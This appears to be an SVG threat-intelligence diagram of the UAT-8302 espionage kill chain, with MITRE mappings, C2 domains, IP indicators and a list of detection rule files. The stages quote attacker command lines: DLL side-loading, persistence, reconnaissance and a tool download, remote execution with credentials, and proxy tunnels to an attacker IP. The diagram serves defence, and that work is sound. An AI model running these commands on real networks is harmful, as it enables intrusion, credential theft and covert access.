<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 1180" role="img" aria-labelledby="t d">
  <title id="t">UAT-8302 kill chain — Cisco Talos, May 2026</title>
  <desc id="d">UAT-8302 is a China-nexus APT targeting government entities in South America and southeastern Europe. The chain combines DLL side-loading triads (NetDraft, CloudSorcerer v3, VSHELL with SNOWLIGHT or SNOWRUST stagers), open-source recon and credential extraction tooling, scheduled-task persistence under Microsoft\Windows\Maps, Microsoft Graph and OneDrive C2 plus GitHub or GameSpot dead-drop resolvers, and Stowaway, anyproxy or SoftEther VPN tunnels to bulletproof subnets.</desc>
  <defs>
    <style>
      .bg-stage     { fill: #f6f8fa; stroke: #d1d9e0; stroke-width: 1; }
      .bg-c2        { fill: #fff8c5; stroke: #d4a72c; stroke-width: 1; }
      .bg-det       { fill: #ddf4ff; stroke: #54aeff; stroke-width: 1; }
      .stagebg      { fill: #0969da; }
      .stagenum     { fill: #ffffff; font: 700 11px sans-serif; }
      .label        { fill: #1f2328; font: 600 13px sans-serif; }
      .sub          { fill: #424a53; font: 12px sans-serif; }
      .ioc          { fill: #57606a; font: 10.5px ui-monospace, "SFMono-Regular", Consolas, monospace; }
      .mitre        { fill: #0969da; font: 600 11px ui-monospace, "SFMono-Regular", Consolas, monospace; }
      .header       { fill: #1f2328; font: 700 18px sans-serif; }
      .subhead      { fill: #57606a; font: 12px sans-serif; }
      .lane         { fill: #57606a; font: 11px sans-serif; }
      .arrow        { stroke: #57606a; stroke-width: 1.6; fill: none; }
      .arrow-fill   { fill: #57606a; }
      .det-title    { fill: #0550ae; font: 700 13px sans-serif; }
      .det-line     { fill: #1f2328; font: 11.5px sans-serif; }
      @media (prefers-color-scheme: dark) {
        .bg-stage   { fill: #161b22; stroke: #30363d; }
        .bg-c2      { fill: #2d2206; stroke: #9e6a03; }
        .bg-det     { fill: #0c2a47; stroke: #1f6feb; }
        .stagebg    { fill: #58a6ff; }
        .stagenum   { fill: #0d1117; }
        .label      { fill: #c9d1d9; }
        .sub        { fill: #8b949e; }
        .ioc        { fill: #8b949e; }
        .mitre      { fill: #58a6ff; }
        .header     { fill: #c9d1d9; }
        .subhead    { fill: #8b949e; }
        .lane       { fill: #8b949e; }
        .arrow      { stroke: #8b949e; }
        .arrow-fill { fill: #8b949e; }
        .det-title  { fill: #79c0ff; }
        .det-line   { fill: #c9d1d9; }
      }
    </style>
    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" class="arrow-fill"/>
    </marker>
  </defs>

  <!-- Header -->
  <text x="40" y="34" class="header">UAT-8302 — China-nexus government espionage</text>
  <text x="40" y="54" class="subhead">Cisco Talos, May 2026 — NetDraft / CloudSorcerer v3 / VSHELL / SNOWLIGHT / SNOWRUST / SNAPPYBEE+ZingDoor / Draculoader</text>

  <!-- Lane labels -->
  <text x="40" y="90" class="lane">VICTIM HOST (gov enterprise — South America / SE Europe)</text>
  <text x="640" y="90" class="lane">ATTACKER C2 / PROXY FABRIC</text>

  <!-- Stage 1 — Initial Access -->
  <rect x="40" y="100" width="500" height="78" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="122" r="13" class="stagebg"/>
  <text x="58" y="126" class="stagenum">1</text>
  <text x="84" y="120" class="label">Initial Access (profile: edge n-day or 0-day)</text>
  <text x="84" y="138" class="sub">Pattern aligned with UNC5174 / UAT-6382 — edge appliance or web-facing CVE</text>
  <text x="84" y="156" class="mitre">T1190</text>
  <text x="84" y="172" class="ioc">no specific CVE attributed by Talos in this disclosure</text>

  <!-- Stage 2 — DLL side-loading triad -->
  <rect x="40" y="190" width="500" height="92" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="212" r="13" class="stagebg"/>
  <text x="58" y="216" class="stagenum">2</text>
  <text x="84" y="210" class="label">Execution / Defense Evasion — side-load triad</text>
  <text x="84" y="228" class="sub">Yandex.exe + mspdb60.dll + test.ini  /  VMtools.exe + mspdb60.dll + vm.ini</text>
  <text x="84" y="244" class="sub">Inject shellcode into explorer.exe / dpapimig.exe / spoolsv.exe</text>
  <text x="84" y="262" class="mitre">T1574.002, T1055.012, T1140</text>
  <text x="84" y="278" class="ioc">XOR key 0x99 in SNOWLIGHT/SNOWRUST → VSHELL final</text>

  <!-- Stage 3 — Persistence -->
  <rect x="40" y="294" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="316" r="13" class="stagebg"/>
  <text x="58" y="320" class="stagenum">3</text>
  <text x="84" y="314" class="label">Persistence — fake "Microsoft\Windows\Maps" schtasks</text>
  <text x="84" y="332" class="sub">schtasks /tn Microsoft\Windows\Maps\{guid} /tr C:\ProgramData\Microsoft\Microsoft\Appunion.exe</text>
  <text x="84" y="350" class="mitre">T1053.005</text>
  <text x="84" y="366" class="ioc">TN: ReconLiteDebug, RunWhatPC — distinctive literals</text>

  <!-- Stage 4 — Recon -->
  <rect x="40" y="390" width="500" height="98" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="412" r="13" class="stagebg"/>
  <text x="58" y="416" class="stagenum">4</text>
  <text x="84" y="410" class="label">Discovery — whatpc.ps1 + open-source scanners</text>
  <text x="84" y="428" class="sub">whoami /priv /groups; net user /domain; nltest /dclist /domain_trusts</text>
  <text x="84" y="446" class="sub">ping sweep for /l + IPC$ portscan; gogo / httpx / naabu / dddd</text>
  <text x="84" y="464" class="mitre">T1018, T1046, T1069.002, T1087.002, T1135, T1482</text>
  <text x="84" y="480" class="ioc">curl GitHub Releases → gogo_windows_amd64.exe → go.exe</text>

  <!-- Stage 5 — Credential Access -->
  <rect x="40" y="500" width="500" height="98" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="522" r="13" class="stagebg"/>
  <text x="58" y="526" class="stagenum">5</text>
  <text x="84" y="520" class="label">Credential Access — OSS tooling, AD dump</text>
  <text x="84" y="538" class="sub">adconnectdump.py (Entra Connect creds), MobaXtermDecryptor (sysadmin SSH)</text>
  <text x="84" y="556" class="sub">ae.exe -snapshot result.dat → 7zr.exe a r.7z (full AD snapshot)</text>
  <text x="84" y="574" class="sub">SharpGetUserLoginIPRP (DC RPC login info)</text>
  <text x="84" y="592" class="mitre">T1003.001, T1555.003, T1098</text>

  <!-- Stage 6 — Lateral Movement -->
  <rect x="40" y="610" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="632" r="13" class="stagebg"/>
  <text x="58" y="636" class="stagenum">6</text>
  <text x="84" y="630" class="label">Lateral Movement — Impacket + WMIC + schtasks /S</text>
  <text x="84" y="648" class="sub">wmic /node:&lt;ip&gt; process call create cmd /c c:\programdata\e1.bat</text>
  <text x="84" y="666" class="sub">schtasks /S &lt;ip&gt; /U user /P pass /create /tn Runbat /ru SYSTEM /f</text>
  <text x="84" y="684" class="mitre">T1021.002, T1047, T1053.005</text>

  <!-- Stage 7 — C2 -->
  <rect x="40" y="706" width="500" height="98" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="728" r="13" class="stagebg"/>
  <text x="58" y="732" class="stagenum">7</text>
  <text x="84" y="726" class="label">Command and Control — three parallel channels</text>
  <text x="84" y="744" class="sub">NetDraft → Microsoft Graph + OneDrive (legit TLS, blends in)</text>
  <text x="84" y="762" class="sub">CloudSorcerer v3 → GitHub or GameSpot dead-drop → derived URL / OAuth token</text>
  <text x="84" y="780" class="sub">VSHELL → drivelivelime.com, msiidentity.com, *.workers.dev</text>
  <text x="84" y="798" class="mitre">T1071.001, T1102.002, T1568.002</text>

  <!-- Stage 8 — Backdoor pre-positioning -->
  <rect x="40" y="816" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="838" r="13" class="stagebg"/>
  <text x="58" y="842" class="stagenum">8</text>
  <text x="84" y="836" class="label">Backdoor pre-positioning — Stowaway / anyproxy / SoftEther</text>
  <text x="84" y="854" class="sub">wagent.exe -c 85.209.156.3:56456;  mmc.exe -l 85.209.156.3:56456 -s &lt;pass&gt;</text>
  <text x="84" y="872" class="sub">Communicator.exe /usermode (SoftEther VPN tunnel)</text>
  <text x="84" y="890" class="mitre">T1090.001, T1090.002, T1572</text>

  <!-- Stage 9 — Impact -->
  <rect x="40" y="912" width="500" height="68" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="934" r="13" class="stagebg"/>
  <text x="58" y="938" class="stagenum">9</text>
  <text x="84" y="932" class="label">Impact — long-term espionage (no destructive payload)</text>
  <text x="84" y="950" class="sub">Persistent intelligence collection, AD snapshots, credential reuse</text>
  <text x="84" y="968" class="mitre">no T1485/T1486/T1490 — pre-positioning posture</text>

  <!-- C2 cluster box -->
  <rect x="600" y="100" width="240" height="320" rx="6" ry="6" class="bg-c2"/>
  <text x="612" y="124" class="label">C2 / Proxy fabric</text>
  <text x="612" y="146" class="ioc">drivelivelime.com</text>
  <text x="612" y="162" class="ioc">msiidentity.com</text>
  <text x="612" y="178" class="ioc">trafficmanagerupdate.com</text>
  <text x="612" y="194" class="ioc">update-kaspersky.workers.dev</text>
  <text x="612" y="210" class="ioc">graph.microsoft.com  (NetDraft)</text>
  <text x="612" y="226" class="ioc">github.com / gamespot.com</text>
  <text x="612" y="242" class="ioc">  (CloudSorcerer dead-drop)</text>
  <text x="612" y="266" class="label">Bulletproof subnet</text>
  <text x="612" y="288" class="ioc">85.209.156.3:56456</text>
  <text x="612" y="304" class="ioc">45.135.135.100:443</text>
  <text x="612" y="320" class="ioc">45.140.168.62</text>
  <text x="612" y="336" class="ioc">88.151.195.133</text>
  <text x="612" y="352" class="ioc">156.238.224.82</text>
  <text x="612" y="368" class="ioc">185.238.189.41:8080</text>
  <text x="612" y="384" class="ioc">103.27.108.55:48265</text>
  <text x="612" y="400" class="ioc">38.54.32.244</text>

  <!-- Bidirectional arrow C2 <-> stage 7 -->
  <line x1="540" y1="755" x2="600" y2="260" class="arrow" marker-end="url(#arr)" marker-start="url(#arr)"/>

  <!-- Vertical chain arrows between stages -->
  <line x1="290" y1="178" x2="290" y2="190" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="282" x2="290" y2="294" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="378" x2="290" y2="390" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="488" x2="290" y2="500" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="598" x2="290" y2="610" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="694" x2="290" y2="706" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="804" x2="290" y2="816" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="900" x2="290" y2="912" class="arrow" marker-end="url(#arr)"/>

  <!-- Detection anchors box -->
  <rect x="40" y="1000" width="800" height="160" rx="6" ry="6" class="bg-det"/>
  <text x="56" y="1024" class="det-title">Detection anchors (this folder's rule files)</text>
  <text x="56" y="1048" class="det-line">• sigma/uat8302_side_load_mspdb60_wininet.yml — image_load anomalies for mspdb60.dll / wininet.dll outside System32</text>
  <text x="56" y="1068" class="det-line">• sigma/uat8302_recon_scheduled_tasks.yml — ReconLiteDebug / RunWhatPC / Microsoft\Windows\Maps\{guid} schtasks /create</text>
  <text x="56" y="1088" class="det-line">• sigma/uat8302_oss_recon_credential_tooling.yml — gogo / httpx / naabu / dddd / ADExplorer snapshot / adconnectdump.py</text>
  <text x="56" y="1108" class="det-line">• kql/uat8302_netdraft_graph_egress.kql — non-browser process beaconing graph.microsoft.com from ProgramData\Microsoft\Microsoft</text>
  <text x="56" y="1128" class="det-line">• kql/uat8302_deaddrop_resolver_chain.kql — GitHub or GameSpot pull followed within 5 min by a derived public IP</text>
  <text x="56" y="1148" class="det-line">• suricata/uat8302_c2_domains_subnet.rules — TLS SNI + HTTP host anchors + bulletproof subnet egress (sids 8110001-8110005)</text>
</svg>
